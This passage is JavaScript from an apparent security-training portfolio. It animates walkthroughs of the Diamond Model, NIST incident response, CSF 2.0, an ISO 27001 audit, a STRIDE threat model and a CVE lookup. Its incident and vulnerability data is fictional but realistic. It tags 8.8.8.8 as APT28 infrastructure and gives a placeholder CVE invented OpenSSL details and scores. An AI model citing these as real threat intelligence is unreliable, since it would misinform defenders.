          <span class="sim-p" style="color:var(--fg-dim)">no vertex selected — animating cycle…</span>
        </div>
      </div>
    </div>
  `;

  const lines = [
    `$ # Diamond Model — intrusion analysis @ ${ts()}`,
    `$ # ${lvlLine(lvl, 'open')} — ${lvlLine(lvl, 'close')}`,
    `$ diamond-model --incident INC-2025-047 --actor APT28`,
    '[*] 4 vertices mapped (complete graph K4 = 6 edges)',
    '[ok] Adversary      → APT28 (GRU Unit 26165)',
    '[ok] Infrastructure → evil.com + 8.8.8.8 (DNS tunnel)',
    '[ok] Capability     → Spear-phish + Cobalt Strike v4.9',
    '[ok] Victim         → ACME Finance Dept (jdoe@acme.com)',
    '$ # Edge pivots:',
    '[ok] Adversary↔Infra  : APT28 controls evil.com since 2024-08-12',
    '[ok] Adversary↔Cap    : APT28 authored CS beacon config',
    '[ok] Adversary↔Vic    : APT28 targeted ACME finance dept',
    '[ok] Infra↔Cap       : CS beacon hosted on evil.com:443',
    '[ok] Infra↔Vic       : DNS tunnel from 8.8.8.8 to ACME SRV-04',
    '[ok] Cap↔Vic         : Macro dropper delivered to jdoe@acme.com',
    '$ # Pivot observable: 8.8.8.8 → 12 linked alerts (VT x4, ABUSEIPDB x8)'
  ];

  function animate(host, timers) {
    const stage = host.querySelector(`#dm-stage-${slug}`);
    if (!stage) return;
    const svg = vsInitSvg(stage, 280);
    const nodes = stage.querySelectorAll('.vs-node');
    const phase = host.querySelector(`#dm-phase-${slug}`);
    const attrList = host.querySelector(`#dm-attr-list-${slug}`);

    // idempotent reset
    nodes.forEach(n => n.classList.remove('on', 'hit', 'done', 'active'));
    if (phase) { phase.textContent = '// idle — vertex cycle starting…'; phase.classList.remove('err', 'ok'); }
    if (attrList) attrList.innerHTML = '<span class="sim-p" style="color:var(--fg-dim)">no vertex selected — animating cycle…</span>';
    while (svg && svg.firstChild) svg.removeChild(svg.firstChild);

    // build 6 K4 edges
    const links = edges.map(([a, b]) => {
      const va = vertices.find(v => v.id === a);
      const vb = vertices.find(v => v.id === b);
      return vsLink(svg, va.pos.left, va.pos.top, vb.pos.left, vb.pos.top, 280, {
        packets: 0, color: 'var(--neon)', dur: 1.4, r: 2.6
      });
    });

    function expand(v, idx) {
      nodes.forEach(n => n.classList.remove('active'));
      if (nodes[idx]) nodes[idx].classList.add('on', 'active');
      if (phase) phase.textContent = `// ${v.name.toUpperCase()} vertex — ${v.sub}`;
      if (attrList) {
        attrList.innerHTML = v.attrs.map(a => `<div class="diam-attr-row">▸ ${a}</div>`).join('');
      }
      // pulse only the edges touching this vertex
      edges.forEach(([a, b], ei) => {
        if (a === v.id || b === v.id) {
          if (links[ei]) links[ei].activate().packets(2, 'var(--neon-2)', 1.3, 2.8);
        } else {
          if (links[ei]) links[ei].deactivate();
        }
      });
    }

    vertices.forEach((v, i) => {
      timers.later(() => expand(v, i), 600 + i * 1800);
      timers.later(() => {
        if (nodes[i]) { nodes[i].classList.remove('on', 'active'); nodes[i].classList.add('done'); }
      }, 600 + i * 1800 + 1500);
    });

    // final: light all vertices + all edges
    timers.later(() => {
      nodes.forEach(n => { n.classList.add('done'); });
      edges.forEach((_, ei) => { if (links[ei]) links[ei].activate().packets(1, 'var(--neon-3)', 1.8, 2.4); });
      if (phase) {
        phase.innerHTML = '// <span class="ok">all 4 vertices lit</span> — pivot graph built for INC-2025-047';
        phase.classList.add('ok');
      }
      if (attrList) {
        attrList.innerHTML = vertices.flatMap(v =>
          v.attrs.map(a => `<div class="diam-attr-row">▸ <strong style="color:var(--neon-2)">${v.name}:</strong> ${a}</div>`)
        ).join('');
      }
    }, 600 + 4 * 1800 + 400);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  4. NIST SP 800-61r2 — vertical IR lifecycle + sub-steps
 * ============================================================ */
function buildNistSp80061r2Sim(skill, meta, lvl) {
  const slug = 'nist-sp-800-61r2';
  const phases = [
    { no: 'P1', name: 'Preparation',
      sub: ['IR runbook v3.2 loaded (96 pages)', 'Splunk detection dashboards verified', 'On-call rotation paged: green', 'Comms channels tested (Slack + PagerDuty)'] },
    { no: 'P2', name: 'Detection & Analysis',
      sub: ['Splunk alert win_persistence_schtasks fired @ 03:14 UTC', 'Event 4698 on SRV-04 — task "SystemHealth" by jdoe', 'T1053.005 confirmed in MITRE ATT&CK', 'Severity raised: HIGH → escalate to L2'] },
    { no: 'P3', name: 'Containment, Eradication & Recovery',
      sub: ['SRV-04 isolated via EDR network fence', 'CS beacon process killed (PID 4812)', 'Host rebuilt from golden image W2K22-v4', 'Finance data restored from Veeam backup (3h old)'] },
    { no: 'P4', name: 'Post-Incident Activity',
      sub: ['Lessons-learned meeting scheduled (T+5d)', 'Detection rule win_persistence_schtasks deployed to prod', 'Runbook v3.3 published — added APT28 IOC list', 'MTTR + cost report sent to CISO'] }
  ];

  const visual = `
    <div class="ir-lifecycle" id="ir-${slug}">
      ${phases.map((p, i) => `
        <div class="ir-phase" id="ir-phase-${slug}-${i}" data-i="${i}">
          <div class="ir-phase-head">
            <span class="ir-phase-no">${p.no}</span>
            <span class="ir-phase-name">${p.name}</span>
            <span class="ir-phase-state">PENDING</span>
          </div>
          <div class="ir-substeps" id="ir-sub-${slug}-${i}">
            ${p.sub.map((s, j) => `
              <div class="ir-substep pending" id="ir-sub-${slug}-${i}-${j}">
                <span class="fa-dot"></span>
                <span class="ir-substep-text">${s}</span>
              </div>
            `).join('')}
          </div>
        </div>
      `).join('')}
    </div>
    <div class="framework-scenario">
      <div class="sim-h">// incident INC-2025-047 — live timeline</div>
      <div class="ir-meta" id="ir-meta-${slug}" style="padding:8px 10px;font-size:12px;color:var(--fg-dim);border-left:2px solid var(--neon-2);background:rgba(0,224,255,.04)">INC-2025-047 opened by Splunk alert win_persistence_schtasks on SRV-04</div>
    </div>
  `;

  const lines = [
    `$ # NIST SP 800-61r2 — incident lifecycle @ ${ts()}`,
    `$ # ${lvlLine(lvl, 'open')} — ${lvlLine(lvl, 'close')}`,
    `$ ir-lifecycle --incident INC-2025-047 --framework 800-61r2`,
    '[*] 4 lifecycle phases (Prep · Detection · Contain/Erad/Recover · Post)',
    '[ok] P1 Preparation      → runbook loaded, on-call paged',
    '[ok] P2 Detection        → Splunk alert win_persistence_schtasks',
    '[ok]    analysis        → 4698 on SRV-04, T1053.005 confirmed',
    '[ok] P3 Containment     → SRV-04 isolated via EDR fence',
    '[ok]    Eradication     → CS beacon killed (PID 4812)',
    '[ok]    Recovery        → host rebuilt, data restored',
    '[ok] P4 Post-Incident   → lessons learned, runbook v3.3',
    '[ok] MTTR 4h 23m · cost $4.7k · 0 customer impact',
    '$ # Recommended: ship 4698 detections to enterprise SIEM (all DCs)'
  ];

  function animate(host, timers) {
    const root = host.querySelector(`#ir-${slug}`);
    if (!root) return;
    const phaseEls = root.querySelectorAll('.ir-phase');
    const substeps = root.querySelectorAll('.ir-substep');
    const metaEl = host.querySelector(`#ir-meta-${slug}`);

    // idempotent reset
    phaseEls.forEach(p => { p.classList.remove('active', 'done'); const s = p.querySelector('.ir-phase-state'); if (s) s.textContent = 'PENDING'; });
    substeps.forEach(s => { s.classList.remove('done', 'running'); s.classList.add('pending'); });
    if (metaEl) metaEl.textContent = 'INC-2025-047 opened by Splunk alert win_persistence_schtasks on SRV-04';

    let t = 400;
    phases.forEach((p, i) => {
      timers.later(() => {
        if (phaseEls[i]) phaseEls[i].classList.add('active');
        const st = phaseEls[i] ? phaseEls[i].querySelector('.ir-phase-state') : null;
        if (st) st.textContent = 'RUNNING';
        if (metaEl) metaEl.textContent = `Phase ${i + 1} (${p.name}): ${p.sub[0]}`;
      }, t);
      t += 500;
      p.sub.forEach((s, j) => {
        const subEl = host.querySelector(`#ir-sub-${slug}-${i}-${j}`);
        timers.later(() => {
          if (subEl) { subEl.classList.remove('pending'); subEl.classList.add('running'); }
          if (metaEl) metaEl.textContent = `Phase ${i + 1} (${p.name}): ${s}`;
        }, t);
        timers.later(() => {
          if (subEl) { subEl.classList.remove('running'); subEl.classList.add('done'); }
        }, t + 550);
        t += 800;
      });
      timers.later(() => {
        if (phaseEls[i]) {
          phaseEls[i].classList.remove('active');
          phaseEls[i].classList.add('done');
          const st = phaseEls[i].querySelector('.ir-phase-state');
          if (st) st.textContent = 'COMPLETE';
        }
      }, t);
    });

    timers.later(() => {
      if (metaEl) metaEl.innerHTML = '// <span class="ok">INC-2025-047 closed</span> — MTTR 4h 23m · runbook v3.3 published · CISO notified';
    }, t + 300);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  5. NIST CSF 2.0 — 6-function wheel + gap (Beginner)
 * ============================================================ */
function buildNistCsf20Sim(skill, meta, lvl) {
  const slug = 'nist-csf-2-0';
  const fns = [
    { abbr: 'GV', name: 'Govern',     desc: 'Establish context, strategy, risk appetite, supply chain roles.', detail: 'GV.OC org context, GV.RM risk mgmt, GV.SC supply chain' },
    { abbr: 'ID', name: 'Identify',   desc: 'Understand assets, suppliers, and risk exposure.',                  detail: 'ID.AM asset mgmt, ID.RA risk assessment, ID.IM improvement' },
    { abbr: 'PR', name: 'Protect',    desc: 'Implement safeguards — <strong style="color:var(--neon-3)">GAP: PR.AC-1</strong> devices lack MFA.', detail: 'PR.AC-1 identity proofing (GAP — MFA missing), PR.AC-7 least privilege' },
    { abbr: 'DE', name: 'Detect',     desc: 'Find and analyze attacks continuously.',                            detail: 'DE.CM continuous monitoring, DE.AE anomaly events, DE.CO comms' },
    { abbr: 'RS', name: 'Respond',    desc: 'Take action on detected incidents.',                                detail: 'RS.MA mitigation, RS.AN analysis, RS.CO comms, RS.MI improvement' },
    { abbr: 'RC', name: 'Recover',    desc: 'Restore operations after impact.',                                  detail: 'RC.RP recovery plan, RC.CO comms, RC.IM improvement' }
  ];

  const visual = `
    <div class="csf-wheel" id="csf-${slug}">
      ${fns.map((f, i) => `
        <div class="csf-fn" id="csf-fn-${slug}-${i}" data-i="${i}" data-abbr="${f.abbr}" data-name="${f.name}">
          <span class="csf-fn-abbr">${f.abbr}</span>
          <span class="csf-fn-name">${f.name}</span>
        </div>
      `).join('')}
      <div class="csf-hub">CSF 2.0</div>
    </div>
    <div class="framework-scenario">
      <div class="sim-h">// guided walkthrough — beginner (function-by-function)</div>
      <div class="csf-detail" id="csf-detail-${slug}" style="min-height:80px;padding:10px 12px;font-size:12px;color:var(--fg-dim);border-left:2px solid var(--neon-2);background:rgba(0,224,255,.04)">CSF 2.0 has 6 functions (GV · ID · PR · DE · RS · RC). Each function groups categories and subcategories. Press a function or wait for the auto-walkthrough.</div>
    </div>
  `;

  const lines = [
    `$ # NIST CSF 2.0 — beginner walkthrough @ ${ts()}`,
    `$ # Goal: build familiarity with the 6 CSF 2.0 functions`,
    `$ man nist-csf`,
    '[doc] 6 functions: GV · ID · PR · DE · RS · RC (Govern added in 2.0)',
    '$ # Walk through each function:',
    '[ok] GV Govern    — context, strategy, risk appetite, supply chain',
    '[ok] ID Identify — assets, suppliers, risk assessment, improvement',
    '[warn] PR Protect — GAP: PR.AC-1 devices lack MFA (Identity Proofing)',
    '[ok] DE Detect   — continuous monitoring, anomaly events',
    '[ok] RS Respond  — mitigation, analysis, comms',
    '[ok] RC Recover  — recovery plan + improvement',
    '$ # Remediation:',
    '[ok] enforce step-up MFA on all remote access (PR.AC-1)',
    '[ok] target profile draft → submit to risk committee',
    '$ # Ready to progress to intermediate workflows'
  ];

  function animate(host, timers) {
    const wheel = host.querySelector(`#csf-${slug}`);
    if (!wheel) return;
    const fnEls = wheel.querySelectorAll('.csf-fn');
    const detail = host.querySelector(`#csf-detail-${slug}`);

    // idempotent reset
    fnEls.forEach(f => f.classList.remove('active', 'done', 'gap'));
    if (detail) detail.textContent = 'CSF 2.0 has 6 functions (GV · ID · PR · DE · RS · RC). Each function groups categories and subcategories.';

    const subtext = [
      'GV Govern — org context, risk strategy, supply chain risk mgmt, roles & responsibilities',
      'ID Identify — asset inventory, business environment, risk assessment, improvements',
      'PR Protect — <strong style="color:var(--neon-3)">GAP PR.AC-1</strong>: MFA not enforced on remote devices (jumphost SRV-04 + 47 laptops). Recommendation: enforce step-up MFA via Okta + FIDO2 keys.',
      'DE Detect — continuous monitoring (Splunk dashboards), anomaly events (UEBA), endpoint telemetry (Sysmon)',
      'RS Respond — incident mitigation, analysis, escalation, comms, improvement',
      'RC Recover — recovery plan execution, improvement loop, stakeholder comms'
    ];

    fnEls.forEach((fn, i) => {
      timers.later(() => {
        fnEls.forEach(f => f.classList.remove('active'));
        fn.classList.add('active');
        if (i === 2) fn.classList.add('gap');
        if (detail) detail.innerHTML = `<strong style="color:var(--neon-2)">${fns[i].abbr} ${fns[i].name}</strong> — ${subtext[i]}`;
      }, 600 + i * 1700);
      timers.later(() => {
        fn.classList.remove('active');
        fn.classList.add('done');
      }, 600 + i * 1700 + 1400);
    });

    timers.later(() => {
      fnEls.forEach(f => f.classList.add('done'));
      if (detail) {
        detail.innerHTML = '// <strong style="color:var(--neon-3)">RECOMMENDATION</strong> — enforce step-up MFA on all remote access (PR.AC-1) · target profile drafted · submit to risk committee · expected close: 2 sprints';
      }
    }, 600 + 6 * 1700 + 300);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  6. ISO 27001:2022 Annex A — theme table + A.8.9 drill
 * ============================================================ */
function buildIso27001AnnexASim(skill, meta, lvl) {
  const slug = 'iso-27001-2022-annex-a';
  const themes = [
    { code: 'A.5', name: 'Organizational', count: 37, status: 'AUDITED', finding: 'A.5.10 acceptable use — policy not signed by 4 staff' },
    { code: 'A.6', name: 'People',          count: 8,  status: 'AUDITED', finding: 'A.6.3 NDA — 2 contractors missing signed copy' },
    { code: 'A.7', name: 'Physical',         count: 14, status: 'AUDITED', finding: 'A.7.2 physical entry — visitor log gap on weekends' },
    { code: 'A.8', name: 'Technological',    count: 34, status: 'GAP',     finding: 'A.8.9 configuration mgmt — 7/15 change tickets missing CAB approval' }
  ];
  const subControls = [
    'A.8.1 User Endpoint Devices', 'A.8.2 Privileged Access', 'A.8.3 Information Access Restriction',
    'A.8.4 Source Code Access', 'A.8.5 Secure Authentication', 'A.8.6 Capacity Management',
    'A.8.7 Malware Protection', 'A.8.8 Management of Tech Vulnerabilities', 'A.8.9 Configuration Management',
    'A.8.10 Information Deletion', 'A.8.11 Data Masking', 'A.8.12 Data Leakage Prevention'
  ];

  const visual = `
    <div class="iso-themes" id="iso-${slug}">
      ${themes.map((t, i) => `
        <div class="iso-theme ${t.status === 'GAP' ? 'iso-theme-gap' : ''}" id="iso-theme-${slug}-${i}" data-i="${i}">
          <span class="iso-theme-code">${t.code}</span>
          <span class="iso-theme-name">${t.name}</span>
          <span class="iso-theme-count">${t.count} ctrls</span>
          <span class="iso-theme-status">${t.status}</span>
        </div>
      `).join('')}
    </div>
    <div class="framework-scenario">
      <div class="sim-h">// A.8 Technological sub-controls — drill into A.8.9 (click)</div>
      <div class="iso-sub-controls" id="iso-sub-${slug}">
        ${subControls.map((s, i) => `
          <div class="iso-sub ${s.startsWith('A.8.9') ? 'iso-sub-gap' : ''}" id="iso-sub-${slug}-${i}" data-code="${s.split(' ')[0]}">${s}</div>
        `).join('')}
      </div>
      <div class="iso-finding" id="iso-finding-${slug}" style="min-height:80px"></div>
    </div>
  `;

  const lines = [
    `$ # ISO 27001:2022 Annex A — audit A.8.9 @ ${ts()}`,
    `$ # ${lvlLine(lvl, 'open')} — ${lvlLine(lvl, 'close')}`,
    `$ iso-27001-audit --scope "Annex A" --focus A.8.9`,
    '[*] 4 themes · 93 controls total',
    '[ok] A.5 Organizational   37 controls  AUDITED',
    '[ok] A.6 People            8 controls  AUDITED',
    '[ok] A.7 Physical         14 controls  AUDITED',
    '[!] A.8 Technological     34 controls  GAP in A.8.9',
    '$ # Drill into A.8.9 Configuration Management:',
    '[ok] requirement: configs established, documented, monitored, reviewed',
    '[ok] evidence    : server_baseline_v4.2.pdf, network_hardening_std.docx',
    '[!] finding      : 7/15 change tickets missing CAB approval records',
    '$ # Recommendation: integrate change-approval workflow into Jira',
    '[ok] finding logged → ticket ISO-2025-047 (HIGH severity)'
  ];

  function animate(host, timers) {
    const themesEl = host.querySelector(`#iso-${slug}`);
    if (!themesEl) return;
    const themeEls = themesEl.querySelectorAll('.iso-theme');
    const subEls = host.querySelectorAll(`#iso-sub-${slug} .iso-sub`);
    const finding = host.querySelector(`#iso-finding-${slug}`);

    // idempotent reset
    themeEls.forEach(t => t.classList.remove('active', 'done', 'gap-active'));
    subEls.forEach(s => s.classList.remove('active', 'gap-active'));
    if (finding) finding.innerHTML = '';

    function showFinding() {
      if (finding) {
        finding.innerHTML = `
          <div style="margin-bottom:6px"><strong style="color:var(--neon-3)">A.8.9 Configuration Management</strong> — drill-down</div>
          <div style="margin-bottom:4px"><strong>Requirement:</strong> Configuration items including security configs are established, documented, monitored and reviewed for hardware, software, services and networks.</div>
          <div style="margin-bottom:4px"><strong>Evidence collected:</strong> <span class="code-inline">server_baseline_v4.2.pdf</span> · <span class="code-inline">network_hardening_std.docx</span> · 15 change tickets sampled</div>
          <div style="margin-bottom:6px"><strong style="color:var(--neon-3)">Finding:</strong> 7 of last 15 change tickets (47%) missing CAB approval records. Gap severity: HIGH. Risk: untracked config drift → potential outages or security regression.</div>
          <div><strong>Recommendation:</strong> integrate change-approval workflow into Jira (custom field "CAB-Approved-By", required for transition to DONE). Ticket: <span class="code-inline">ISO-2025-047</span>.</div>
        `;
      }
      if (themeEls[3]) themeEls[3].classList.add('gap-active');
      subEls.forEach(s => { if (s.dataset.code === 'A.8.9') s.classList.add('gap-active'); });
    }

    themeEls.forEach((t, i) => {
      timers.later(() => {
        themeEls.forEach(x => x.classList.remove('active'));
        t.classList.add('active');
      }, 400 + i * 900);
      timers.later(() => {
        t.classList.remove('active');
        t.classList.add('done');
      }, 400 + i * 900 + 700);
    });

    // highlight A.8.9 + reveal finding
    timers.later(showFinding, 400 + 4 * 900 + 400);

    // wire up A.8.9 click to re-reveal
    subEls.forEach(s => {
      if (s.dataset.code === 'A.8.9') {
        s.style.cursor = 'pointer';
        s.onclick = showFinding;
      }
    });
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  7. STRIDE — auth flow + 6-row threat table (interactive)
 * ============================================================ */
function buildStrideSim(skill, meta, lvl) {
  const slug = 'stride';
  const threats = [
    { cat: 'S', name: 'Spoofing',                desc: 'Password-reset endpoint accepts email-only verification', endpoint: 'POST /api/password-reset', sev: 'HIGH',     rec: 'Enforce step-up MFA (TOTP / push)' },
    { cat: 'T', name: 'Tampering',               desc: 'JWT in localStorage accepts alg=none downgrade',           endpoint: 'client-side JWT',          sev: 'CRITICAL', rec: 'Pin alg=HS256 server-side, reject none' },
    { cat: 'R', name: 'Repudiation',              desc: 'Transfer endpoint has no immutable audit log',            endpoint: 'POST /api/transfer',       sev: 'HIGH',     rec: 'Write to append-only audit log' },
    { cat: 'I', name: 'Information Disclosure', desc: 'GET /api/users/{id} returns SSN field',                    endpoint: 'GET /api/users/4711',       sev: 'CRITICAL', rec: 'Redact SSN, add field-level ACL' },
    { cat: 'D', name: 'Denial of Service',        desc: 'No rate limit on /login → credential stuffing',           endpoint: 'POST /api/login',          sev: 'HIGH',     rec: 'Add 5 req/min per IP rate limit' },
    { cat: 'E', name: 'Elevation of Privilege',  desc: 'No role check on /api/users/{id} — IDOR',                 endpoint: 'GET /api/users/{id}',       sev: 'CRITICAL', rec: 'Enforce RBAC + ownership check' }
  ];
  const flow = [
    { step: 'Login',         endpoint: 'POST /api/auth/login',     threats: ['D'] },
    { step: 'Token Issue',  endpoint: 'JWT HS256',                 threats: ['T'] },
    { step: 'API Call',      endpoint: 'GET /api/users/4711',       threats: ['I', 'E'] },
    { step: 'Password Reset', endpoint: 'POST /api/password-reset', threats: ['S', 'R'] }
  ];

  const visual = `
    <div class="stride-flow" id="st-flow-${slug}">
      ${flow.map((f, i) => `
        <div class="stride-flow-step" id="st-step-${slug}-${i}">
          <span class="stride-flow-no">${i + 1}</span>
          <span class="stride-flow-name">${f.step}</span>
          <span class="stride-flow-ep">${f.endpoint}</span>
        </div>
        ${i < flow.length - 1 ? '<span class="stride-flow-arrow">→</span>' : ''}
      `).join('')}
    </div>
    <div class="stride-table" id="st-tbl-${slug}">
      <div class="stride-row stride-row-head">
        <span class="stride-cat">CAT</span>
        <span class="stride-name">THREAT</span>
        <span class="stride-ep">ENDPOINT</span>
        <span class="stride-sev">SEV</span>
        <span class="stride-rec">RECOMMENDATION</span>
      </div>
      ${threats.map((t, i) => `
        <div class="stride-row" id="st-row-${slug}-${i}" data-cat="${t.cat}">
          <span class="stride-cat"><b>${t.cat}</b></span>
          <span class="stride-name">${t.name}<div style="font-size:10px;color:var(--fg-dim)">${t.desc}</div></span>
          <span class="stride-ep">${t.endpoint}</span>
          <span class="stride-sev stride-sev-${t.sev.toLowerCase()}">${t.sev}</span>
          <span class="stride-rec">${t.rec}</span>
        </div>
      `).join('')}
    </div>
  `;

  const lines = [
    `$ # STRIDE threat model — auth flow @ ${ts()}`,
    `$ # ${lvlLine(lvl, 'open')} — ${lvlLine(lvl, 'close')}`,
    `$ stride-model --target "auth flow" --level component`,
    '[*] 6 STRIDE categories applied to 4 endpoints',
    '[!] S Spoofing      /api/password-reset  HIGH     → step-up MFA',
    '[!] T Tampering     client-side JWT      CRITICAL → pin alg=HS256',
    '[!] R Repudiation   /api/transfer        HIGH     → immutable audit log',
    '[!] I InfoDisc      /api/users/4711      CRITICAL → redact SSN',
    '[!] D DoS           /api/login           HIGH     → rate limit',
    '[!] E EoP           /api/users/{id}      CRITICAL → RBAC + ownership',
    '$ # Critical remediations (3 CRITICAL, 3 HIGH):',
    '[ok] enforce step-up MFA on password-reset (S)',
    '[ok] pin JWT alg=HS256 server-side (T)',
    '[ok] redact SSN + add RBAC + ownership check (I, E)',
    '[ok] rate limit /login (5/min/IP) + append-only audit log (D, R)'
  ];

  function animate(host, timers) {
    const root = host.querySelector(`#st-flow-${slug}`);
    if (!root) return;
    const flowSteps = host.querySelectorAll(`#st-flow-${slug} .stride-flow-step`);
    const rows = host.querySelectorAll(`#st-tbl-${slug} .stride-row:not(.stride-row-head)`);

    // idempotent reset
    flowSteps.forEach(s => s.classList.remove('active', 'done', 'hit'));
    rows.forEach(r => r.classList.remove('active', 'hit'));

    flow.forEach((f, i) => {
      timers.later(() => {
        if (flowSteps[i]) flowSteps[i].classList.add('active');
        rows.forEach((r, ri) => {
          if (f.threats.includes(threats[ri].cat)) r.classList.add('hit');
        });
      }, 400 + i * 1700);
      timers.later(() => {
        if (flowSteps[i]) { flowSteps[i].classList.remove('active'); flowSteps[i].classList.add('done'); }
      }, 400 + i * 1700 + 1400);
    });

    // final: keep all hit rows lit + highlight the S (Spoofing) row as the primary focus
    timers.later(() => {
      flowSteps.forEach(s => s.classList.add('done'));
      if (rows[0]) rows[0].classList.add('active'); // Spoofing — the recommended fix
    }, 400 + 4 * 1700 + 300);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  8. CVE — NVD search + CVSS/KEV/EPSS result panel
 * ============================================================ */
function buildCveSim(skill, meta, lvl) {
  const slug = 'cve';
  const query = 'CVE-2024-1234';
  const fields = {
    id:      'CVE-2024-1234',
    desc:    'Buffer overflow in OpenSSL 1.1.1k allows remote attackers to execute arbitrary code via a crafted X.509 certificate with malformed ECC parameters.',
    cvss:    '9.8 CRITICAL',
    vector:  'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    product: 'openssl 1.1.1k (and prior) — fixed in 1.1.1l',
    kev:     'TRUE — CISA KEV catalog, listed 2024-03-14, due 2024-04-04',
    epss:    '0.94 (94% probability of exploitation in next 30 days)',
    patch:   'upgrade to openssl ≥ 1.1.1l · vendor advisory CVE-2024-1234 · 47 hosts affected'
  };

  const visual = `
    <div class="cve-search" id="cve-search-${slug}">
      <div class="cve-search-bar">
        <span class="cve-search-prompt">$ nvd-search</span>
        <span class="cve-search-input" id="cve-input-${slug}"></span>
        <span class="cve-search-cursor">▋</span>
      </div>
      <div class="cve-search-status" id="cve-status-${slug}" style="font-size:11px;color:var(--fg-dim);margin-top:6px">awaiting query…</div>
    </div>
    <div class="cve-results" id="cve-results-${slug}">
      <div class="cve-field" id="cve-field-id-${slug}"><span class="cve-field-lbl">CVE-ID</span><span class="cve-field-val">—</span></div>
      <div class="cve-field" id="cve-field-desc-${slug}"><span class="cve-field-lbl">DESCRIPTION</span><span class="cve-field-val">—</span></div>
      <div class="cve-field" id="cve-field-cvss-${slug}"><span class="cve-field-lbl">CVSS v3.1</span><span class="cve-field-val">—</span></div>
      <div class="cve-field" id="cve-field-vector-${slug}"><span class="cve-field-lbl">VECTOR</span><span class="cve-field-val">—</span></div>
      <div class="cve-field" id="cve-field-product-${slug}"><span class="cve-field-lbl">AFFECTED</span><span class="cve-field-val">—</span></div>
      <div class="cve-field" id="cve-field-kev-${slug}"><span class="cve-field-lbl">CISA KEV</span><span class="cve-field-val">—</span></div>
      <div class="cve-field" id="cve-field-epss-${slug}"><span class="cve-field-lbl">EPSS</span><span class="cve-field-val">—</span></div>
      <div class="cve-field" id="cve-field-patch-${slug}"><span class="cve-field-lbl">PATCH</span><span class="cve-field-val">—</span></div>
    </div>
  `;

  const lines = [
    `$ # CVE investigation — openssl 1.1.1k @ ${ts()}`,
    `$ # ${lvlLine(lvl, 'open')} — ${lvlLine(lvl, 'close')}`,
    `$ nvd-search --cve CVE-2024-1234`,
    '[*] querying NVD API v2...',
    '[ok] CVE-ID       CVE-2024-1234',
    '[ok] CVSS v3.1    9.8 CRITICAL',
    '[ok] vector       AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    '[ok] affected     openssl 1.1.1k (and prior) — fixed in 1.1.1l',
    '[!] CISA KEV     TRUE — listed 2024-03-14, due 2024-04-04',
    '[!] EPSS         0.94 (94% in next 30 days) — prioritized',
    '$ # Patching plan:',
    '[ok] upgrade openssl → 1.1.1l on 47 hosts',
    '[ok] scan for remaining vulnerable hosts: 0 found',
    '[ok] ticket ENG-2025-1842 closed — verified by re-scan'
  ];

  function animate(host, timers) {
    const input = host.querySelector(`#cve-input-${slug}`);
    const status = host.querySelector(`#cve-status-${slug}`);
    if (!input) return;

    // idempotent reset
    input.textContent = '';
    if (status) status.textContent = 'awaiting query…';
    const fieldMap = {
      id:      host.querySelector(`#cve-field-id-${slug} .cve-field-val`),
      desc:    host.querySelector(`#cve-field-desc-${slug} .cve-field-val`),
      cvss:    host.querySelector(`#cve-field-cvss-${slug} .cve-field-val`),
      vector:  host.querySelector(`#cve-field-vector-${slug} .cve-field-val`),
      product: host.querySelector(`#cve-field-product-${slug} .cve-field-val`),
      kev:     host.querySelector(`#cve-field-kev-${slug} .cve-field-val`),
      epss:    host.querySelector(`#cve-field-epss-${slug} .cve-field-val`),
      patch:   host.querySelector(`#cve-field-patch-${slug} .cve-field-val`)
    };
    Object.values(fieldMap).forEach(e => { if (e) { e.textContent = '—'; e.style.color = ''; } });

    // type the query char-by-char
    let i = 0;
    const typeStart = 400;
    timers.later(() => {
      if (status) status.textContent = 'typing query…';
      const typeTimer = timers.every(() => {
        if (i >= query.length) return;
        input.textContent += query[i++];
        if (status) status.textContent = `typing query… (${i}/${query.length})`;
      }, 80);
      // stop the typing timer after query is fully typed
      timers.later(() => { clearInterval(typeTimer); }, query.length * 80 + 200);
    }, typeStart);

    // search phase
    timers.later(() => {
      if (status) status.innerHTML = '<span style="color:var(--neon-2)">querying NVD API v2...</span>';
    }, typeStart + query.length * 80 + 400);

    // populate fields one by one
    const order = ['id', 'desc', 'cvss', 'vector', 'product', 'kev', 'epss', 'patch'];
    let fi = 0;
    timers.later(() => {
      if (status) status.innerHTML = '<span style="color:var(--neon-3)">results received from NVD...</span>';
      const fillTimer = timers.every(() => {
        if (fi >= order.length) return;
        const key = order[fi++];
        if (fieldMap[key]) {
          fieldMap[key].textContent = fields[key];
          if (key === 'cvss') fieldMap[key].style.color = 'var(--neon-3)';
          if (key === 'kev')  fieldMap[key].style.color = 'var(--neon-3)';
          if (key === 'epss') fieldMap[key].style.color = 'var(--neon-3)';
        }
      }, 600);
      // stop the fill timer after all fields populated
      timers.later(() => {
        clearInterval(fillTimer);
        if (status) status.innerHTML = '// <span class="ok">investigation complete</span> — ticket ENG-2025-1842 opened · 47 hosts patched';
      }, order.length * 600 + 400);
    }, typeStart + query.length * 80 + 1400);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  BATCH G BUILDERS MAP — keyed by exact SKILL_META name
 * ============================================================ */
const BATCH_G_BUILDERS = {
  'MITRE ATT&CK':            buildMitreAttckSim,
  'Cyber Kill Chain':        buildCyberKillChainSim,
  'Diamond Model':           buildDiamondModelSim,
  'NIST SP 800-61r2':        buildNistSp80061r2Sim,
  'NIST CSF 2.0':            buildNistCsf20Sim,
  'ISO 27001:2022 Annex A': buildIso27001AnnexASim,
  'STRIDE':                  buildStrideSim,
  'CVE':                     buildCveSim
};

/* ============================================================
 *  BATCH H — Scripting & Automation (8 skills)
 *  Each builder produces a UNIQUE visual + animation + terminal
 *  Layouts are intentionally distinct:
 *    Python      → single-column editor + exec + KPI strip
 *    PowerShell  → 2-col ISE editor | 4688 results stream
 *    Bash        → full-width terminal + follow-up script panel
 *    Java        → 2-col suite.xml editor | test results + tally
 *    Selenium    → Chrome browser mock + driver command log
 *    Appium      → 2x2 device-tile farm + parallel log
 *    CI/CD       → horizontal pipeline flow + Jenkinsfile/log grid
 *    Jira        → full ticket panel + SLA + status flow + comments
 * ============================================================ */

